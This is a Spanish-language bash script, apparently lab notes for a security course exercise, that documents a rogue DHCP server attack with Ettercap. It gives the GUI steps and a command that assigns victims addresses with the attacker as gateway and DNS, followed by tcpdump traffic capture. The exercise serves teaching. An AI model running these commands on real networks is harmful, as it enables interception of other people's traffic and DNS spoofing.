#!/bin/bash
# ==============================================================================
# Comandos de Ataque DHCP Rogue Server con Ettercap
# Práctica 42: DHCP Rogue Server
# ==============================================================================
#
# Este script documenta los comandos utilizados durante la práctica.
# NO ejecutar directamente, usar como referencia.
#
# ADVERTENCIA: Solo usar en entornos de laboratorio controlados.
#
# ==============================================================================

# ========================================
# VERIFICAR INTERFAZ DE RED
# ========================================
# Identificar la interfaz conectada al segmento de ataque
ip link show
ip addr show

# ========================================
# CONFIGURAR ARCHIVO etter.conf (Opcional)
# ========================================
# Editar configuración de Ettercap si es necesario:
# sudo nano /etc/ettercap/etter.conf

# Asegurarse que las siguientes líneas estén descomentadas:
# ec_uid = 0
# ec_gid = 0

# ========================================
# EJECUTAR ATAQUE DHCP ROGUE SERVER
# ========================================

# Opción 1: Interfaz gráfica (GTK)
# --------------------------------
sudo ettercap -G

# Dentro de la interfaz:
# 1. Sniff -> Unified Sniffing
# 2. Seleccionar la interfaz de red (ej: eth0)
# 3. Mitm -> DHCP Spoofing
# 4. Configurar parámetros:
#    - IP Pool: 10.0.0.100-10.0.0.200 (IPs falsas a asignar)
#    - Netmask: 255.255.255.0
#    - DNS Server IP: 10.0.0.1 (IP del atacante como DNS)
# 5. Start -> Start Sniffing
# 6. Observar los clientes que obtienen IPs del servidor falso

# Opción 2: Línea de comandos
# ---------------------------
# Crear archivo de configuración del DHCP falso:
# sudo ettercap -T -M dhcp:10.0.0.100-200/255.255.255.0/10.0.0.1 -i eth0

# ========================================
# PARÁMETROS DEL SERVIDOR DHCP FALSO
# ========================================
# Los parámetros típicos que se configuran son:
#
# - Pool de direcciones: Rango de IPs que el servidor falso asignará
# - Gateway: IP del atacante para capturar todo el tráfico
# - DNS: IP del atacante para realizar DNS spoofing
# - Máscara de red: Debe coincidir con la red objetivo

# ========================================
# VERIFICAR IMPACTO DEL ATAQUE
# ========================================
# En un cliente víctima, verificar la configuración obtenida:
# ip addr show
# ip route show
# cat /etc/resolv.conf

# El cliente tendrá:
# - IP del rango del servidor falso
# - Gateway apuntando al atacante
# - DNS apuntando al atacante

# ========================================
# CAPTURA DE TRÁFICO (Post-ataque)
# ========================================
# Una vez que el tráfico pasa por el atacante:
# sudo tcpdump -i eth0 -w captura.pcap

# O ver en tiempo real:
# sudo tcpdump -i eth0 -n

# ========================================
# DETENER EL ATAQUE
# ========================================
# En Ettercap: Start -> Stop Sniffing
# O presionar 'q' en modo texto
